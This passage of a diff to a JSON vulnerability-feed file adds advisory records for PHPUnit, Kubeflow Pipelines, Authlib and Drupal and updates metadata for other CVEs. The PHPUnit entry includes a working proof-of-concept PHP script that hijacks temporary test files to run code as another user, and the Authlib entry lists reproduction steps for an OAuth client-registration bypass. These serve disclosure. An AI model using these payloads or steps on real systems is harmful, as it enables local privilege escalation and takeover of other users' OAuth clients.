data.\n\nAfter the test, PHPUnit deletes both files, but not the directory. Once PHPUnit has created the directory for the developer, other users cannot write to it, unless the developer's umask allows this.\n\nPHPUnit 12.5 and earlier are not affected: these versions write the temporary files next to the PHPT test file.\n\nPHPUnit 13.4.4 creates the directory for the temporary files of PHPT tests with an unpredictable name and with permissions that only allow the current user to access it. A directory that already exists is not used.\n\n### Proof of concept\n\nThe following steps reproduce the issue on a Linux system with two users, `alice` (the developer) and `mallory` (the attacker), that share `/tmp`. They require PHP 8.4.1 or later with the `posix` extension and a code coverage driver (PCOV or Xdebug) as well as Composer.\n\n1. As `root`, create the two users and make sure that `/tmp` has its default permissions (`1777`) and that `/tmp/phpunit-phpt` does not exist:\n\n   ```\n   useradd -m alice\n   useradd -m mallory\n   ls -ld /tmp\n   rm -rf /tmp/phpunit-phpt\n   ```\n\n2. As `alice`, create a project with a PHPT test and a source file to collect code coverage for:\n\n   ```\n   mkdir -p ~/project/src ~/project/tests\n   cd ~/project\n   composer require --dev phpunit/phpunit:13.4.3\n   ```\n\n   `~/project/src/Greeter.php`:\n\n   ```php\n   <?php declare(strict_types=1);\n   final class Greeter\n   {\n       public function greet(): string\n       {\n           return 'ok';\n       }\n   }\n   ```\n\n   `~/project/tests/greeter.phpt`:\n\n   ```\n   --TEST--\n   PHPT test that is run with code coverage\n   --FILE--\n   <?php declare(strict_types=1);\n   require __DIR__ . '/../src/Greeter.php';\n   print (new Greeter)->greet();\n   --EXPECT--\n   ok\n   ```\n\n   `~/project/phpunit.xml`:\n\n   ```xml\n   <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n   <phpunit xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:noNamespaceSchemaLocation=\"vendor/phpunit/phpunit/phpunit.xsd\">\n       <source>\n           <include>\n               <directory>src</directory>\n           </include>\n       </source>\n   </phpunit>\n   ```\n\n3. As `mallory`, save the following script as `~/attack.php` and run it using `php ~/attack.php`. It creates `/tmp/phpunit-phpt`, waits for job files to appear in it, and replaces each of them with code that records the identity of the user that executes it and then executes the original job file:\n\n   ```php\n   <?php declare(strict_types=1);\n   $directory = '/tmp/phpunit-phpt';\n\n   if (!@mkdir($directory)) {\n       exit($directory . ' already exists' . PHP_EOL);\n   }\n\n   chmod($directory, 0777);\n\n   $payload = '<?php file_put_contents(__DIR__ . \"/proof.txt\", shell_exec(\"id\"), FILE_APPEND); require __FILE__ . \".orig\";' . PHP_EOL;\n   $replaced = [];\n\n   while (true) {\n       foreach (glob($directory . '/phpunit_phpt_*.php') as $job) {\n           if (isset($replaced[$job])) {\n               continue;\n           }\n\n           $replaced[$job] = true;\n\n           file_put_contents($directory . '/payload.tmp', $payload);\n           rename($job, $job . '.orig');\n           rename($directory . '/payload.tmp', $job);\n\n           print 'Replaced ' . $job . PHP_EOL;\n       }\n\n       usleep(1000);\n   }\n   ```\n\n4. As `alice`, run the PHPT test with code coverage (when Xdebug is used, prefix the command with `XDEBUG_MODE=coverage`):\n\n   ```\n   cd ~/project\n   vendor/bin/phpunit --coverage-text tests/greeter.phpt\n   ```\n\n   PHPUnit reports `OK (1 test, 1 assertion)`, and the code coverage report shows that `Greeter::greet()` is covered. Nothing in the output indicates that the code of the test was replaced.\n\n5. Check which user executed the code that `mallory` put in place:\n\n   ```\n   cat /tmp/phpunit-phpt/proof.txt\n   ```\n\n   The file is owned by `alice` and contains the output of `id` for `alice`, for instance:\n\n   ```\n   uid=1000(alice) gid=1000(alice) groups=1000(alice)\n   ```\n\n\n### Impact\n\nThis is a local privilege escalation (CWE-379: Creation of Temporary File in Directory with Incorrect Permissions). A local user can execute arbitrary code with the privileges of another user who runs PHPT tests with code coverage. This gives the attacker access to everything the developer can access, for instance source code, credentials, and SSH keys.\n\nAffected are users of PHPUnit 13.4.0 to 13.4.3 when all of the following apply:\n\n* **PHPT tests with code coverage:** PHPT tests are run while code coverage is collected, which requires a code coverage driver such as PCOV or Xdebug\n* **Shared path for temporary files:** The path used for temporary files (`sys_get_temp_dir()`) is shared between users. This is the case on Linux and other Unix-like systems with a shared `/tmp`, unless per-user temporary directories are used, for instance through systemd's `PrivateTmp`, `pam_namespace`, or a per-user `TMPDIR`. On macOS and Windows, the path used for temporary files is specific to the user by default\n* **Local account:** The attacker has an account on the same system, or controls a process that runs under another account, for instance a service\n* **First to create the directory:** The attacker creates the directory before the developer runs PHPT tests with code coverage for the first time since the path used for temporary files was last cleaned\n\nSystems on which no other user, including system accounts that run services, can create files in the path used for temporary files are not affected. This is typically the case for a container or an ephemeral CI runner that is used by a single user.",
+      "published": "2026-10-30T23:01:21Z",
+      "updated": "2026-10-30T23:01:23Z",
+      "cvss": 5.4,
+      "cvss_vector": "CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+      "severity": "medium",
+      "cpes": [],
+      "packages": [
+        "composer:phpunit/phpunit"
+      ],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/advisories/GHSA-9vw2-f4vp-x7gf",
+        "https://github.com/sebastianbergmann/phpunit/security/advisories/GHSA-9vw2-f4vp-x7gf",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-119193",
+        "https://github.com/sebastianbergmann/phpunit/commit/ae31c78a86e9d6c641497bacf47462d7bb7d7f34",
+        "https://github.com/FriendsOfPHP/security-advisories/blob/master/phpunit/phpunit/CVE-2026-119193.yaml",
+        "https://github.com/sebastianbergmann/phpunit/releases/tag/13.4.4"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00113,
+      "epss_percentile": 0.01422,
+      "x_mentions": null,
+      "sources": [
+        "ghsa"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-31T02:24:15.834484+00:00",
+      "matched": [
+        "php"
+      ],
+      "match_type": "keyword",
+      "tier": 1,
+      "score": 36.8,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 21.0,
+        "cvss": 10.8,
+        "rce": 5,
         "epss": 0.0
       },
       "ai_analysis": ""
@@ -57144,6 +57605,60 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-118759",
+      "aliases": [
+        "GHSA-wg5q-x4j9-qm54"
+      ],
+      "title": "Kubeflow Pipelines: Run-log endpoint permits unauthorized access to pod logs",
+      "description": "## Summary\n\nThe Kubeflow Pipelines API server's `GET /apis/v1alpha1/runs/{run_id}/nodes/{node_id}/log` handler retrieves logs without authorizing the caller against the selected run. A caller who can reach the backend and knows a victim run ID and a suitable pod or node identifier can read live or archived logs using the API server's permissions.\n\nFor live logs, the vulnerable handler also accepts the supplied node ID as a pod name in the run's namespace without verifying that the pod belongs to the run. Depending on the API server's pod-log permissions, a known run ID can therefore permit reading the `main` container logs of an unrelated pod in that namespace. Logs may contain sensitive workload data or credentials.\n\nThe affected handler does not authenticate the request itself. An external authentication gate or network policy can restrict reachability; public ingress exposure and unauthenticated enumeration of run IDs are not assumed.\n\n## Remediation\n\nUpgrade the API server to **[Kubeflow Pipelines 2.18.0](https://github.com/kubeflow/pipelines/releases/tag/2.18.0)**. Versions through 2.17.3 are affected; the first affected release has not been established.\n\n[PR #13684](https://github.com/kubeflow/pipelines/pull/13684) authorizes the caller with the `readLog` verb before retrieving live or archived logs. For live logs, it also verifies that the pod's `pipeline/runid` label matches the requested run. Custom Kubernetes roles must grant `readLog` on `runs` in the `pipelines.kubeflow.org` API group; the bundled viewer and editor roles include it. Shared read access alone does not grant log access.\n\nUntil upgrading, restrict access to the backend log endpoint. Focused regression tests cover authorization denial, HTTP identity propagation, pod/run mismatch, archive retrieval, and cancellation; no new deployed-cluster end-to-end test was performed for this assessment.\n\n## Credit\n\n[bugbunny.ai](https://bugbunny.ai) discovered and reported the issue. Nayyar ([@naruto-lgtm](https://github.com/naruto-lgtm)) authored the fix in #13684.\n\n[@patchmyday](https://github.com/patchmyday), [@thesecguy45](https://github.com/thesecguy45), [@VitoCrl](https://github.com/VitoCrl), [@Grg0rry](https://github.com/Grg0rry), [@arpitjain099](https://github.com/arpitjain099), and [@BrianWillows](https://github.com/BrianWillows) made later submissions concerning the run-log authorization gap. **MUTEDCYBERSECURITY S.L.** separately reported a synthetic two-tenant reproduction, including the unrelated-pod log path.",
+      "published": "2026-10-30T23:13:29Z",
+      "updated": "2026-10-30T23:13:31Z",
+      "cvss": 7.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "severity": "high",
+      "cpes": [],
+      "packages": [
+        "go:github.com/kubeflow/pipelines"
+      ],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/advisories/GHSA-wg5q-x4j9-qm54",
+        "https://github.com/kubeflow/pipelines/security/advisories/GHSA-wg5q-x4j9-qm54",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-118759",
+        "https://github.com/kubeflow/pipelines/pull/13684",
+        "https://github.com/kubeflow/pipelines/commit/be4723e33727c6dad71a95cba61e8f61562ab20f",
+        "https://github.com/kubeflow/pipelines/releases/tag/2.18.0"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00336,
+      "epss_percentile": 0.27013,
+      "x_mentions": null,
+      "sources": [
+        "ghsa"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-31T02:24:15.834484+00:00",
+      "matched": [
+        "kubernetes"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 34.1,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 15.0,
+        "unauth_network": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-113649",
       "aliases": [],
       "title": "",
@@ -60090,6 +60605,59 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-116672",
+      "aliases": [
+        "GHSA-c73q-w75p-j82v"
+      ],
+      "title": "Authlib RFC 7592 examples omit registration-access-token client binding",
+      "description": "## Description\n\n### Summary\n\nRFC 7592 (OAuth 2.0 Dynamic Client Registration Management Protocol) lets a previously registered client read, update, or delete its own registration, authenticated by a `registration_access_token` issued specifically to that client at registration time. The entire security model of this protocol depends on the server verifying that the token presented in the request actually belongs to the client identified in the request, not merely that the token is valid for some client.\n\nAuthlib's `ClientConfigurationEndpoint` implements the control flow correctly in structure, calling `authenticate_token`, then `authenticate_client`, then `check_permission`, and treats all three as abstract methods that \"Developers MUST implement in subclass.\" The problem is that the documented example implementations for these methods, taken together exactly as written, never perform the one check that matters: binding the authenticated token to the specific client being accessed. A developer who implements these methods by following the provided examples ends up with a complete authorization bypass on this endpoint.\n\n### Details\n\n`authenticate_client`'s documented example (`authlib/oauth2/rfc7592/endpoint.py`):\n\n```python\ndef authenticate_client(self, request):\n    \"\"\"Read a client from the request payload.\n    Developers MUST implement this method in subclass::\n\n        def authenticate_client(self, request):\n            client_id = request.payload.data.get(\"client_id\")\n            return Client.get(client_id=client_id)\n\n    :return: client instance\n    \"\"\"\n    raise NotImplementedError()\n```\n\nThis looks the target client up purely by the `client_id` supplied in the request payload, with no reference to the token at all.\n\n`check_permission`'s documented example, in the same file:\n\n```python\ndef check_permission(self, client, request):\n    \"\"\"Checks whether the current client is allowed to be accessed, edited\n    or deleted. Developers MUST implement it in subclass, e.g.::\n\n        def check_permission(self, client, request):\n            return client.editable\n\n    :return: boolean\n    \"\"\"\n    raise NotImplementedError()\n```\n\nThis checks a property of the target client alone (whether it is generally \"editable\"), again with no reference to `request.credential`, the authenticated token object returned earlier by `authenticate_token` and stored on the request specifically so that later steps can check it:\n\n```python\ndef create_configuration_response(self, request):\n    token = self.authenticate_token(request)\n    if not token:\n        raise AccessDeniedError()\n\n    request.credential = token\n\n    client = self.authenticate_client(request)\n    ...\n    if not self.check_permission(client, request):\n        raise UnauthorizedClientError(...)\n```\n\n`request.credential` is set specifically so that a binding check can be performed downstream, but neither documented example ever reads it. Following both examples as written produces an implementation where the only requirements to access, modify, or delete a client's registration are: possessing any valid registration_access_token for any client, and knowing or guessing the target `client_id`.\n\nThis is meaningfully different from how the equivalent example is written for the token introspection endpoint (RFC 7662) elsewhere in the same codebase, which does correctly demonstrate checking the authenticated caller's own identity (`authlib/oauth2/rfc7662/introspection.py`):\n\n```python\ndef check_permission(self, token, client, request):\n    \"\"\"Check if the request has permission to introspect the token. Developers\n    MUST implement this method::\n\n        def check_permission(self, token, client, request):\n            # only allow a special client to introspect the token\n            return client.client_id == \"introspection_client\"\n    \"\"\"\n```\n\nIn that endpoint, `client` represents the already-authenticated caller (verified through normal client credential authentication earlier in the flow), so checking a property of `client` is meaningful authorization logic. In the RFC 7592 endpoint, `client` instead represents the target being acted upon, not the caller, so the same style of example is actively misleading: it looks like a reasonable authorization check but performs none of the binding the protocol requires.\n\nNo file anywhere in the repository, including the Flask, Django, and SQLAlchemy integration modules, provides a complete, corrected reference implementation of `ClientConfigurationEndpoint`. The misleading docstring examples are the only guidance shipped for this endpoint.\n\n### Realistic exploitability\n\nRFC 7591 dynamic client registration is commonly deployed without requiring an initial access token, since the specification explicitly anticipates open, self-service registration as a normal deployment model. Under that common configuration, an attacker can freely self-register their own throwaway client with no authentication at all, receive a valid `registration_access_token` scoped to that throwaway client, and then present that same token against `/register/{target_client_id}` for any other client, since neither documented example checks that the token corresponds to the target. If the target client's `editable` property (or whatever equivalent the developer implements based on the documented example) is true, an attacker can read the victim client's full registration including its metadata, update it (for example, changing `redirect_uris` to an attacker-controlled endpoint, enabling authorization code or token interception against that client's users), or delete it outright.\n\n### Reproduction\n\n1. Deploy an authorization server using `ClientConfigurationEndpoint` with `authenticate_client` and `check_permission` implemented exactly as documented in the class's own docstrings.\n2. As an attacker, register a new client via the RFC 7591 registration endpoint (commonly open/anonymous), obtaining `client_id_A` and `registration_access_token_A`.\n3. Identify or guess `client_id_B`, belonging to a different, unrelated client.\n4. Send `GET /register/client_id_B` (or `PUT`/`DELETE`) with `Authorization: Bearer registration_access_token_A`, and `client_id` set to `client_id_B` in the request body for the `PUT` case.\n5. `authenticate_token` succeeds because `registration_access_token_A` is a valid token. `authenticate_client` succeeds because it looks up `client_id_B` directly from the payload, ignoring which token was presented. `check_permission` succeeds because it only checks `client_B.editable`, not whether `registration_access_token_A` has any relationship to `client_B`. The request proceeds and returns, modifies, or deletes client B's registration.\n\n### Impact\n\nFull read, modify, and delete access to any other client's registration record, for any party able to obtain a valid registration_access_token for any client of their own. In an open dynamic registration deployment this reduces to no meaningful barrier at all, since attackers can self-issue their own qualifying token for free. Impact includes disclosure of client metadata, redirect URI hijacking enabling authorization code or token interception, and denial of service via deletion of arbitrary client registrations.\n\n## Suggested fix\n\nUpdate the documented example for `check_permission` (or `authenticate_client`) to explicitly demonstrate binding the authenticated token to the target client, for example:\n\n```python\ndef check_permission(self, client, request):\n    return request.credential.client_id == client.get_client_id()\n```\n\nand add an explicit warning in both docstrings that omitting this comparison results in a complete authorization bypass on this endpoint. Consider also shipping a complete, correct reference implementation of `ClientConfigurationEndpoint` in the Flask/Django/SQLAlchemy integration modules, since none currently exists.\n\n---\n\n## Affected products\n\n**Ecosystem:** pip  \n**Package name:** Authlib  \n**Affected versions:** 1.7.2  \n**Patched versions:** 1.9.1\n\n## Severity\n\nPrivileges Required is Low, reflecting that the attacker needs some registration_access_token of their own, which under the common open dynamic registration deployment model is trivially self-issued. This is a documentation/reference-implementation issue rather than a bug the library enforces unconditionally on every deployment, since `authenticate_client` and `check_permission` are abstract methods a developer must implement; the finding is that the only guidance provided for implementing them correctly is, itself, exploitable if followed as written.",
+      "published": "2026-10-30T23:09:04Z",
+      "updated": "2026-10-30T23:09:05Z",
+      "cvss": 8.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [],
+      "packages": [
+        "pip:authlib"
+      ],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/advisories/GHSA-c73q-w75p-j82v",
+        "https://github.com/authlib/authlib/security/advisories/GHSA-c73q-w75p-j82v",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-116672",
+        "https://github.com/authlib/authlib/commit/1bd2a313492ce0a4d0571c150730907aa3fc91ff",
+        "https://github.com/authlib/authlib/releases/tag/v1.9.1",
+        "https://github.com/advisories/GHSA-c73q-w75p-j82v"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00274,
+      "epss_percentile": 0.19832,
+      "x_mentions": null,
+      "sources": [
+        "ghsa"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-31T02:24:15.834484+00:00",
+      "matched": [
+        "django"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 31.6,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 17.6,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-110215",
       "aliases": [],
       "title": "",
@@ -60478,34 +61046,31 @@
     {
       "id": "CVE-2026-62284",
       "aliases": [],
-      "title": "OSAC operator: Kubeconfig credential-plugin execution and SSRF in console proxy",
+      "title": "",
       "description": "OSAC operator is a Kubernetes operator. In the affected revision identified as 8220502, the `console-proxy` `RemoteConfigResolver` parses Kubernetes Secret kubeconfig data with `clientcmd.RESTConfigFromKubeConfig` without sanitizing the resulting `rest.Config`. An attacker who can create or modify a Secret labeled `osac.openshift.io/remote-cluster-kubeconfig`: \"true\" in a namespace where the proxy's RoleBinding grants Secret read access can supply `users[].user.exec`. When `rest.TransportFor` builds the HTTP transport for an upstream WebSocket connection, client-go invokes that exec credential plugin, spawning an arbitrary process as the osac-`console-proxy` service account inside the pod. Attacker-controlled `clusters[].server` also enables server-side request forgery from the proxy pod. Remote and auto VM cluster modes are affected, with auto the default; exclusively `local` mode does not read kubeconfig Secrets and is unaffected. The credential-plugin execution path is patched in commit 7e4222b; that patch does not address the described server-address SSRF path.",
-      "published": "2026-10-30T19:23:39.257Z",
-      "updated": "2026-10-30T22:15:16.751Z",
+      "published": "2026-10-30T20:17:11.727",
+      "updated": "2026-10-30T23:17:12.457",
       "cvss": 8.6,
-      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "high",
       "cpes": [],
       "packages": [],
-      "vendor_products": [
-        "osac-project osac-operator"
-      ],
+      "vendor_products": [],
       "references": [
-        "https://github.com/osac-project/osac-operator/security/advisories/GHSA-5w5g-j6hw-6p8f",
-        "https://github.com/osac-project/osac-operator/pull/321",
         "https://github.com/osac-project/osac-operator/commit/7e4222b6ab465fc00606c8cfed980b226820cb1b",
-        "https://github.com/osac-project/osac-operator/commit/86466378aa3603253dca7fa2f59a2733af0dc092"
+        "https://github.com/osac-project/osac-operator/commit/86466378aa3603253dca7fa2f59a2733af0dc092",
+        "https://github.com/osac-project/osac-operator/pull/321",
+        "https://github.com/osac-project/osac-operator/security/advisories/GHSA-5w5g-j6hw-6p8f"
       ],
       "exploit_ref": false,
       "kev": false,
       "kev_date_added": "",
       "ransomware": false,
-      "ssvc_exploitation": "none",
+      "ssvc_exploitation": "",
       "epss": null,
       "epss_percentile": null,
       "x_mentions": null,
       "sources": [
-        "cve.org",
         "nvd"
       ],
       "category": "vuln",
@@ -61247,6 +61812,53 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-77152",
+      "aliases": [],
+      "title": "Field Collection for Drupal 7 access bypass via missing parent entity access check",
+      "description": "Improper Authorization vulnerability in Drupal Field Collection for Drupal 7 allows a user with the \"edit field collections\" permission to bypass access control on the parent (host) entity.\n\nThe access check for field collection items (field_collection_item_access()) granted edit and delete access to any user holding the \"edit field collections\" permission without verifying the user's access to the host entity. As a result, a user with \"edit field collections\" but without edit/update access to the host entity (for example a node they cannot edit) could edit or delete field collection items attached to that entity, bypassing the intended entity/node access restrictions. The fix requires access to the parent entity in addition to the field collection permission.\n\n\n\nThis issue affects Field Collection for Drupal 7: version 7.x-1.0 up to and including 7.x-1.2.",
+      "published": "2026-10-30T23:56:29.862Z",
+      "updated": "2026-10-31T00:16:51.597",
+      "cvss": 5.3,
+      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
+      "severity": "medium",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [
+        "Drupal Field Collection for Drupal 7"
+      ],
+      "references": [
+        "https://www.herodevs.com/vulnerability-directory/cve-2026-77152",
+        "https://d7es.tag1.com/security-advisories?field_project_target_id=96"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "cve.org",
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-31T02:24:15.834484+00:00",
+      "matched": [
+        "drupal"
+      ],
+      "match_type": "exact",
+      "tier": 2,
+      "score": 30.6,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 20,
+        "cvss": 10.6
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-114053",
       "aliases": [],
       "title": "",
@@ -61857,18 +62469,18 @@
     {
       "id": "CVE-2026-119124",
       "aliases": [],
-      "title": "ImageMagick before 7.1.2-34 Heap Buffer Overflow via -morph Option",
+      "title": "",
       "description": "ImageMagick before 7.1.2-34 contains a heap-based buffer overflow in its -morph processing, where crafted images cause writes beyond the bounds of a heap buffer. An attacker can supply a crafted image that, when processed by a user with the -morph option, corrupts heap memory and crashes the application.",
-      "published": "2026-10-29T15:58:07.508Z",
-      "updated": "2026-10-29T16:18:05.127",
+      "published": "2026-10-29T16:18:05.010",
+      "updated": "2026-10-31T00:50:05.270",
       "cvss": 4.8,
-      "cvss_vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+      "cvss_vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "medium",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [
-        "ImageMagick ImageMagick"
+      "cpes": [
+        "imagemagick:imagemagick"
       ],
+      "packages": [],
+      "vendor_products": [],
       "references": [
         "https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-x48p-6655-8qgv",
         "https://www.vulncheck.com/advisories/imagemagick-before-7.1.2-34-heap-buffer-overflow-via-morph-option"
@@ -61878,11 +62490,10 @@
       "kev_date_added": "",
       "ransomware": false,
       "ssvc_exploitation": "",
-      "epss": null,
-      "epss_percentile": null,
+      "epss": 0.00123,
+      "epss_percentile": 0.02052,
       "x_mentions": null,
       "sources": [
-        "cve.org",
         "nvd"
       ],
       "category": "vuln",
@@ -61897,7 +62508,8 @@
       "level": "low",
       "score_breakdown": {
         "popularity": 20,
-        "cvss": 9.6
+        "cvss": 9.6,
+        "epss": 0.0
       },
       "ai_analysis": ""
     },
@@ -66237,39 +66849,35 @@
     },
     {
       "id": "CVE-2026-115917",
-      "aliases": [
-        "GHSA-vvpg-rrww-wpmh"
-      ],
-      "title": "vLLM: Permissive default CORS origins allow cross-origin requests to the vLLM HTTP server",
-      "description": "### Summary\n\nThe OpenAI-compatible server registers Starlette `CORSMiddleware` with\n`allowed_origins` defaulting to `[\"*\"]`, and performs no authentication unless\n`--api-key` (or `VLLM_API_KEY`) is configured. A web page on any origin can send\nrequests to a vLLM server that the victim's browser can reach (for example\n`localhost` or an internal/VPN address) and read the responses. The default\n`allow_credentials=False` blocks cookie-bearing cross-origin requests; because\nvLLM authenticates with a bearer header rather than cookies, the wildcard still\npermits untokenized access to an unauthenticated server and read access when the\ncaller already holds a token.\n\n### Details\n\nAffected components\n\n- `vllm/entrypoints/launchers/cli_args.py` - `allowed_origins` default value.\n- `vllm/entrypoints/serve/middleware/register.py` - `CORSMiddleware`\n  registration.\n- `vllm/entrypoints/serve/middleware/authenticate.py` - auth middleware and its\n  guarded path prefixes.\n\n Root cause\n\n`vllm/entrypoints/launchers/cli_args.py`:\n\n```python\nallow_credentials: bool = False\n\"\"\"Allow credentials.\"\"\"\nallowed_origins: list[str] = field(default_factory=lambda: [\"*\"])\n\"\"\"Allowed origins.\"\"\"\n```\n\n`vllm/entrypoints/serve/middleware/register.py`:\n\n```python\napp.add_middleware(\n    CORSMiddleware,\n    allow_origins=args.allowed_origins,\n    allow_credentials=args.allow_credentials,\n    allow_methods=args.allowed_methods,\n    allow_headers=args.allowed_headers,\n)\n```\n\nThe auth middleware is added only when a token is configured and guards only the\n`/v1`, `/v2`, `/inference`, and `/cohere` prefixes. `/v1/load_lora_adapter` and\n`/v1/unload_lora_adapter` are inside `/v1` and therefore do require a key when\none is set; they are open only when no key is configured and dynamic LoRA\nupdating is enabled.\n\n### Impact\n\n\n- A malicious page can enumerate models (`GET /v1/models`), issue\n  `POST /v1/chat/completions`, consume GPU time, and read model output through\n  the victim's browser.\n- When the server is reachable only from the victim's network, the browser acts\n  as a proxy a remote website could not otherwise use.\n- With `allow_credentials=False`, cookie-based CSRF does not apply; the exposure\n  is cross-origin request execution and response disclosure.\n\nThis advisory was fixed in [MR61009](https://github.com/vllm-project/vllm/pull/61009).",
-      "published": "2026-10-28T21:15:49Z",
-      "updated": "2026-10-28T21:15:50Z",
+      "aliases": [],
+      "title": "",
+      "description": "vLLM is an inference and serving engine for large language models. Prior to 0.32.0, the OpenAI-compatible server configures Starlette CORSMiddleware with allowed_origins set to a wildcard by default. A malicious web page can use a victim's browser to reach an unauthenticated vLLM server on localhost, an internal network, or a VPN, call endpoints including GET /v1/models and POST /v1/chat/completions, consume GPU resources, and read responses. Cookie-based cross-site request forgery does not apply because credentials are disabled by default, and deployments requiring bearer authentication are exposed only when the caller already has a usable token. This issue is fixed in version 0.32.0.",
+      "published": "2026-10-26T18:17:39.263",
+      "updated": "2026-10-31T02:17:29.527",
       "cvss": 3.4,
       "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:N",
       "severity": "low",
-      "cpes": [],
-      "packages": [
-        "pip:vllm"
+      "cpes": [
+        "vllm:vllm"
       ],
+      "packages": [],
       "vendor_products": [],
       "references": [
-        "https://github.com/advisories/GHSA-vvpg-rrww-wpmh",
-        "https://github.com/vllm-project/vllm/security/advisories/GHSA-vvpg-rrww-wpmh",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-115917",
-        "https://github.com/vllm-project/vllm/pull/61009",
         "https://github.com/vllm-project/vllm/commit/fcae5c98870ff2c20659731dce7ba3a3ff0d48aa",
-        "https://github.com/vllm-project/vllm/releases/tag/v0.32.0"
+        "https://github.com/vllm-project/vllm/pull/61009",
+        "https://github.com/vllm-project/vllm/releases/tag/v0.32.0",
+        "https://github.com/vllm-project/vllm/security/advisories/GHSA-vvpg-rrww-wpmh"
       ],
       "exploit_ref": false,
       "kev": false,
       "kev_date_added": "",
       "ransomware": false,
       "ssvc_exploitation": "",
-      "epss": 0.00238,
-      "epss_percentile": 0.14816,
+      "epss": 0.0024,
+      "epss_percentile": 0.15215,
       "x_mentions": null,
       "sources": [
-        "ghsa"
+        "nvd"
       ],
       "category": "vuln",
       "resolved_at": "",
